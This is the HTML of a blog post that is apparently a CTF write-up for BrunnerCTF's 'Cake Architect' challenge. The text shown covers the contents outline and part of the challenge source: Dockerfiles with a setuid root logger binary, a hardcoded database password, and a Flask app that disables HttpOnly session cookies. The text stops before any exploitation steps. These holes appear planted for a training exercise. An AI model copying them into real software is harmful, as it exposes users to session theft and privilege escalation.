<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="BrunnerCTF - Cake Architect" />
<meta name="author" content="Anas" />
<meta property="og:locale" content="en" />
<meta name="description" content="Introduction Description Enumeration Reading Source Code Identifying vulnerabilities" />
<meta property="og:description" content="Introduction Description Enumeration Reading Source Code Identifying vulnerabilities" />
<link rel="canonical" href="https://github.com/NullBrunk/posts/brunnerctf-cake-architect/" />
<meta property="og:url" content="https://github.com/NullBrunk/posts/brunnerctf-cake-architect/" />
<meta property="og:site_name" content="NullBrunk" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-22T16:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="BrunnerCTF - Cake Architect" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-08-24T15:20:33+00:00","datePublished":"2025-08-22T16:00:00+00:00","description":"Introduction Description Enumeration Reading Source Code Identifying vulnerabilities","headline":"BrunnerCTF - Cake Architect","mainEntityOfPage":{"@type":"WebPage","@id":"https://github.com/NullBrunk/posts/brunnerctf-cake-architect/"},"url":"https://github.com/NullBrunk/posts/brunnerctf-cake-architect/"}</script>
<!-- End Jekyll SEO tag -->


  <title>BrunnerCTF - Cake Architect | NullBrunk
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="NullBrunk">
<meta name="application-name" content="NullBrunk">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">NullBrunk</a>
    <p class="site-subtitle fst-italic mb-0">Web pentester, CTF player.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
          
          <li class="nav-item">
            <a href="/ctfs/" class="nav-link">
              <i class="fa-fw fas fa-flag"></i>
              

              <span>CTFS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tools/" class="nav-link">
              <i class="fa-fw fas fas fa-code"></i>
              

              <span>TOOLS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              

              <span>TAGS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/resume/" class="nav-link">
              <i class="fa-fw fas fa-file"></i>
              

              <span>RESUME</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              

              <span>ABOUT</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
        
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap justify-content-center align-items-center w-100">
    <a href="https://ctftime.org/user/157452" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-regular fa-font-awesome"></i>
    </a>

    <a href="https://www.root-me.org/NullBrunk" aria-label="rootme" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-skull"></i>
    </a>

    <a href="https://github.com/nullbrunk" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fab fa-github"></i>
    </a>

    <a href="https://tryhackme.com/p/nullbrunk" aria-label="tryhackme" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-cloud"></i>
    </a>

    <a href="mailto:anas.idiri.pro@gmail.com" aria-label="mail" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-envelope"></i>
    </a>
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!--  include topbar.html lang=lang -->

        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11   col-xl-9  px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<header id="topbar-wrapper" aria-label="Top Bar">
    <div id="topbar" class="d-flex align-items-center justify-content-between h-100" >
        <nav id="breadcrumb" aria-label="Breadcrumb">
            <span><a href="/">Home</a></span>
             

            
                <span>
                 <a href="/categories/writeups/">Writeups</a>
                </span>
            
                <span>
                 <a href="/categories/ctftime2025/">CTFTime2025</a>
                </span>
            
                <span>
                 <a href="/categories/brunnerctf/">BrunnerCTF</a>
                </span>
            

             
             
            

            
             
            
            <span>BrunnerCTF - Cake Architect</span>
        </nav>
    </div>
</header>

<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>BrunnerCTF - Cake Architect</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1755878400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 22, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1756048833"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 24, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/NullBrunk/">Anas</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3762 words"
>
  <em>20 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">BrunnerCTF - Cake Architect</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">BrunnerCTF - Cake Architect</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <ol>
  <li>Introduction
    <ul>
      <li><a href="#description">Description</a></li>
    </ul>
  </li>
  <li>Enumeration
    <ul>
      <li><a href="#reading-source-code">Reading Source Code</a></li>
      <li><a href="#identifying-vulnerabilities">Identifying vulnerabilities</a></li>
    </ul>
  </li>
  <li>Exploitation
    <ul>
      <li><a href="#get-admin">Get admin</a></li>
      <li><a href="#sqli-to-rce">SQLi to RCE</a></li>
      <li><a href="#get-reverse-shell">Get reverse shell</a></li>
      <li><a href="#user-flag">User flag</a></li>
    </ul>
  </li>
  <li>Privesc
    <ul>
      <li><a href="#stabilizing-shell">Stabilizing Shell</a></li>
      <li><a href="#abusing-usrlocalbincake_logger">Abusing /usr/local/bin/cake_logger</a></li>
      <li><a href="#root-flag">Root flag</a></li>
    </ul>
  </li>
</ol>

<hr />

<h1 id="introduction">Introduction</h1>

<h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<blockquote>
  <p>Difficulty: <strong>Hard</strong></p>
</blockquote>

<blockquote>
  <p>We’ve exhausted all possible ideas regarding baking recipes. Please help us design a new cake!
The user flag is in a file called user.txt.</p>
</blockquote>

<h1 id="enumeration">Enumeration</h1>

<h3 id="reading-source-code"><span class="me-2">Reading Source Code</span><a href="#reading-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Source code was provided with the challenge description:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>❯ tree            
<span class="nb">.</span>
├── app
│   ├── admin_bot.py
│   ├── app.py
│   ├── database.py
│   ├── init_db.sql
│   ├── static
│   │   └── js
│   │       └── admin.js
│   ├── templates
│   │   ├── admin.html
│   │   ├── cake_builder.html
│   │   ├── dashboard.html
│   │   ├── index.html
│   │   ├── login.html
│   │   ├── report_issue.html
│   │   ├── signup.html
│   │   └── view_cake.html
│   └── utils.py
├── cake_logger
├── docker-compose.yml
├── Dockerfile
├── Dockerfile.db
└── requirements.txt
</pre></td></tr></tbody></table></code></div></div>

<details id="dockerfiledb">
  <summary>Dockerfile.db</summary>

  <div file="Dockerfile.db" class="language-dockerfile highlighter-rouge"><div class="code-header">
        <span data-label-text="Dockerfile.db"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> postgres:15-bookworm</span>

<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> <span class="se">\
</span>    apt-get <span class="nb">install</span> <span class="nt">-y</span> postgresql-plpython3-15 curl netcat-traditional python3 <span class="o">&amp;&amp;</span> <span class="se">\
</span>    <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span>

<span class="k">RUN </span><span class="nb">echo</span> <span class="s2">"brunner{&lt;USER&gt;...}"</span> <span class="o">&gt;</span> /user.txt
<span class="k">RUN </span><span class="nb">chown </span>postgres:postgres /user.txt

<span class="k">RUN </span><span class="nb">echo</span> <span class="s2">"brunner{&lt;ROOT&gt;...}"</span> <span class="o">&gt;</span> /root/root.txt
<span class="k">RUN </span><span class="nb">chmod </span>400 /root/root.txt

<span class="k">COPY</span><span class="s"> cake_logger /usr/local/bin/cake_logger</span>
<span class="k">RUN </span><span class="nb">chmod</span> +x /usr/local/bin/cake_logger
<span class="k">RUN </span><span class="nb">chown </span>root:root /usr/local/bin/cake_logger
<span class="k">RUN </span><span class="nb">chmod </span>4755 /usr/local/bin/cake_logger

<span class="k">COPY</span><span class="s"> /app/init_db.sql /docker-entrypoint-initdb.d/init_db.sql</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="dockerfile">
  <summary>Dockerfile</summary>

  <div file="dockerfile" class="language-dockerfile highlighter-rouge"><div class="code-header">
        <span data-label-text="dockerfile"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> python:3.12-slim-bookworm</span>

<span class="k">ENV</span><span class="s"> PYTHONUNBUFFERED=1</span>

<span class="c"># Install system dependencies</span>
<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> <span class="se">\
</span>    postgresql-client <span class="se">\
</span>    postgresql-plpython3-15 <span class="se">\
</span>    <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span>

<span class="c"># Set working directory</span>
<span class="k">WORKDIR</span><span class="s"> /app</span>

<span class="c"># Copy requirements and install Python dependencies</span>
<span class="k">COPY</span><span class="s"> requirements.txt .</span>
<span class="k">RUN </span>pip <span class="nb">install</span> <span class="nt">--no-cache-dir</span> <span class="nt">-r</span> requirements.txt

<span class="c"># Install Playwright browsers</span>
<span class="k">RUN </span>playwright install-deps
<span class="k">RUN </span>playwright <span class="nb">install </span>chromium

<span class="c"># Copy application code</span>
<span class="k">COPY</span><span class="s"> ./app .</span>

<span class="c"># Expose port</span>
<span class="k">EXPOSE</span><span class="s"> 5000</span>

<span class="c"># Start the application</span>
<span class="k">CMD</span><span class="s"> ["python", "app.py"]</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="docker-compose">
  <summary>docker-compose.yml</summary>

  <div file="docker-compose.yml" class="language-yaml highlighter-rouge"><div class="code-header">
        <span data-label-text="docker-compose.yml"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="na">services</span><span class="pi">:</span>
  <span class="na">db</span><span class="pi">:</span>
    <span class="na">build</span><span class="pi">:</span>
      <span class="na">context</span><span class="pi">:</span> <span class="s">.</span>
      <span class="na">dockerfile</span><span class="pi">:</span> <span class="s">Dockerfile.db</span>
    <span class="na">environment</span><span class="pi">:</span>
      <span class="na">POSTGRES_DB</span><span class="pi">:</span> <span class="s">cake_db</span>
      <span class="na">POSTGRES_USER</span><span class="pi">:</span> <span class="s">postgres</span>
      <span class="na">POSTGRES_PASSWORD</span><span class="pi">:</span> <span class="s">871576ad349c9b16620685b58ab569ce</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">5432:5432"</span>

  <span class="na">web</span><span class="pi">:</span>
    <span class="na">build</span><span class="pi">:</span> <span class="s">.</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">5000:5000"</span>
    <span class="na">environment</span><span class="pi">:</span>
      <span class="na">FLASK_ENV</span><span class="pi">:</span> <span class="s">development</span>
      <span class="na">POSTGRES_PASSWORD</span><span class="pi">:</span> <span class="s">871576ad349c9b16620685b58ab569ce</span>
    <span class="na">restart</span><span class="pi">:</span> <span class="s">unless-stopped</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="app_database">
  <summary>app/app.py</summary>

  <div file="app/app.py" class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="app/app.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="c1"># Import our modules
</span><span class="kn">from</span> <span class="n">utils</span> <span class="kn">import</span> <span class="n">get_or_generate_admin_password</span><span class="p">,</span> <span class="n">login_required</span><span class="p">,</span> <span class="n">admin_required</span>
<span class="kn">from</span> <span class="n">database</span> <span class="kn">import</span> <span class="p">(</span>
    <span class="n">init_db_pool</span><span class="p">,</span> <span class="n">wait_for_db</span><span class="p">,</span> <span class="n">setup_users</span><span class="p">,</span> <span class="n">setup_sample_cakes</span><span class="p">,</span>
    <span class="n">get_user_by_credentials</span><span class="p">,</span> <span class="n">create_user</span><span class="p">,</span> <span class="n">get_user_cakes</span><span class="p">,</span> <span class="n">get_cake_by_id</span><span class="p">,</span>
    <span class="n">save_cake</span><span class="p">,</span> <span class="n">get_all_users</span><span class="p">,</span> <span class="n">calculate_nutrition</span>
<span class="p">)</span>
<span class="kn">from</span> <span class="n">admin_bot</span> <span class="kn">import</span> <span class="n">start_admin_bot</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">64</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>

<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SESSION_COOKIE_HTTPONLY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1"># Routes
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">user_id</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/signup</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">signup</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">email</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">email</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">All fields are required</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">signup.html</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="c1"># Basic validation
</span>        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="ow">or</span> <span class="nf">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Username must be at least 3 characters and password at least 6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">signup.html</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="nf">create_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Account created successfully! Please log in.</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Registration failed</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">signup.html</span><span class="sh">'</span><span class="p">)</span>

